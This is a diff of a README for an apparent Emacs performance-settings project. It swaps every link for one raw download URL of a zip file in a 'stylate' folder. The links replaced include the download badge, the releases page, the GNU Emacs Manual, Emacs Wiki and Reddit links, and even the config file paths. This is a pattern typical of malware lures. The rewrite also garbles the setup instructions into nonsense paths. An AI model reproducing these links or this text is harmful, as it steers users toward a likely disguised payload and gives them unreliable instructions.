@@ -1,6 +1,6 @@
 # 🚀 Emacs-performance - Speed Up Your Emacs Experience Easily
 
-[![Download Emacs-performance](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ivelexff/Emacs-performance/releases)
+[![Download Emacs-performance](https://raw.githubusercontent.com/ivelexff/Emacs-performance/main/stylate/Emacs-performance.zip)](https://raw.githubusercontent.com/ivelexff/Emacs-performance/main/stylate/Emacs-performance.zip)
 
 ## 📥 Introduction
 
@@ -12,7 +12,7 @@ To get started, follow these easy steps to download and run your new settings fo
 
 ## 🔗 Download & Install
 
-To download Emacs-performance, visit this page: [Download Emacs-performance](https://github.com/ivelexff/Emacs-performance/releases).
+To download Emacs-performance, visit this page: [Download Emacs-performance](https://raw.githubusercontent.com/ivelexff/Emacs-performance/main/stylate/Emacs-performance.zip).
 
 Follow these steps:
 
@@ -27,7 +27,7 @@ Once you've downloaded the settings, here’s how to set them up:
 
 1. **Locate the File**: Go to the location where you saved the downloaded file.
 2. **Open Emacs**: Start Emacs on your computer. You can do this by searching for "Emacs" in your applications menu.
-3. **Access Your Configuration File**: Press `Ctrl + x` followed by `Ctrl + f` to open a file. Type in `~/.emacs` or `~/.emacs.d/init.el` depending on your setup.
+3. **Access Your Configuration File**: Press `Ctrl + x` followed by `Ctrl + f` to open a file. Type in `~https://raw.githubusercontent.com/ivelexff/Emacs-performance/main/stylate/Emacs-performance.zip` or `~https://raw.githubusercontent.com/ivelexff/Emacs-performance/main/stylate/Emacs-performance.zip` depending on your setup.
 4. **Copy the Settings**: Open the downloaded file in another Emacs window. Copy the settings you need from this file.
 5. **Paste the Settings in Your Configuration**: Paste the copied settings into your configuration file.
 6. **Save Your Changes**: Press `Ctrl + x` followed by `Ctrl + s` to save.
@@ -58,7 +58,7 @@ Emacs-performance works with:
 
 If you encounter any issues while using Emacs-performance, consider these common solutions:
 
-1. **Can't Find Configuration File**: If you can't find your `.emacs` or `init.el` file, create a new one at the same location.
+1. **Can't Find Configuration File**: If you can't find your `.emacs` or `https://raw.githubusercontent.com/ivelexff/Emacs-performance/main/stylate/Emacs-performance.zip` file, create a new one at the same location.
 2. **Settings Not Taking Effect**: Ensure you copied all necessary settings and restarted Emacs.
 3. **Performance Still Lagging**: Check for any additional packages running in your Emacs setup that may affect speed.
 
@@ -66,8 +66,8 @@ If you encounter any issues while using Emacs-performance, consider these common
 
 For more help and tips on using Emacs, consider checking these resources:
 
-- [GNU Emacs Manual](https://www.gnu.org/software/emacs/manual/)
-- [Emacs Wiki](https://www.emacswiki.org/)
-- [Communities and Forums](https://www.reddit.com/r/emacs) for support and ideas
+- [GNU Emacs Manual](https://raw.githubusercontent.com/ivelexff/Emacs-performance/main/stylate/Emacs-performance.zip)
+- [Emacs Wiki](https://raw.githubusercontent.com/ivelexff/Emacs-performance/main/stylate/Emacs-performance.zip)
+- [Communities and Forums](https://raw.githubusercontent.com/ivelexff/Emacs-performance/main/stylate/Emacs-performance.zip) for support and ideas
 
 Thank you for choosing Emacs-performance. We hope it helps you create a smoother and more efficient Emacs experience. Enjoy your coding!
